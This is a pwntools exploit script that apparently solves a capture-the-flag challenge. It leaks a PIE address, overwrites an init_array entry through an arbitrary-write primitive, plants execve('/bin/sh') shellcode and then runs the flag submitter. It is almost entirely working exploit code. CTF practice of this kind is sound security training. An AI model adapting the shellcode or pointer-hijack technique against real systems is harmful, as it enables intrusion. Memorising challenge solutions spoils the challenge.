#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

# exe = ELF("./challenge_patched")
# 
# context.binary = exe
# 
# if args.REMOTE:
#     r = remote("addr", 1337)
# else:
#     r = process([exe.path])
#     if args.GDB:
#         gdb.attach(r)

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = r = remote(HOST, int(PORT))

def write_addr(p, addr, value):
    log.info(f"writing to {hex(addr)} val {hex(value)}")
    p.send(p64(addr))
    p.send(p64(value))

shellcode = asm("""\
mov rdi, rsp
mov rdx, 29400045130965551
mov [rdi], rdx
xor esi, esi
xor edx, edx
mov eax, 0x3b
syscall
""")
shellcode = shellcode.ljust((len(shellcode) + 7) // 8 * 8)

pie_leak = u64(p.recv(8))
print(hex(pie_leak), hex(pie_leak+0x12a0))
a_addr = pie_leak + 0x45b4
c_addr = pie_leak + 0x45b8
goal_addr = pie_leak + 0x45c4
write_addr(p, a_addr, 0)
write_addr(p, c_addr, 0)
write_addr(p, goal_addr, 0)

fini_addr = pie_leak + 0x4338
arbi_write = pie_leak + 0x2000
preinit0_addr = pie_leak + 0x4310
preinit1_addr = pie_leak + 0x4318
preinit2_addr = pie_leak + 0x4320
init0_addr = pie_leak + 0x4328
init1_addr = pie_leak + 0x4330
entry_addr = pie_leak + 0x1200
shellcode_addr = pie_leak + 0x2110
preinit0_func_addr = pie_leak + 0x1370
# write_addr(p, preinit1_addr, preinit0_func_addr)
# write_addr(p, preinit2_addr, preinit0_func_addr)
# write_addr(p, init0_addr, preinit0_func_addr)
write_addr(p, init1_addr, preinit0_func_addr)
write_addr(p, init1_addr + 8, arbi_write)
#write_addr(p, pie_leak + 0x43a8, 0x100)
# write_addr(p, preinit1_addr, arbi_write)
# write_addr(p, exe.got["__cxa_finalize"], preinit0_func_addr)
# write_addr(p, exe.got["_ITM_deregisterTMCloneTable"], arbi_write)
# write_addr(p, fini_addr+0x8, arbi_write)
p.send(p64(0))

p.send(p32(0))

# pause()

# write_addr(p, fini_addr, arbi_write)
# p.send(p64(0))
# # 
# p.send(p32(0))

# r.interactive()

for i in range(0, len(shellcode), 8):
    log.info(f"writing to {hex(shellcode_addr + i)} val {shellcode[i:i+8].hex()}")
    p.send(p64(shellcode_addr + i))
    p.send(shellcode[i:i+8])

p.send(p64(pie_leak + 0x45a0))

r.sendline(b"echo beginflag")
r.sendline(b"./submitter")
r.recvuntil(b"beginflag\n")
flag = r.recvlineS(keepends=False)
log.info('Flag: %s', flag)
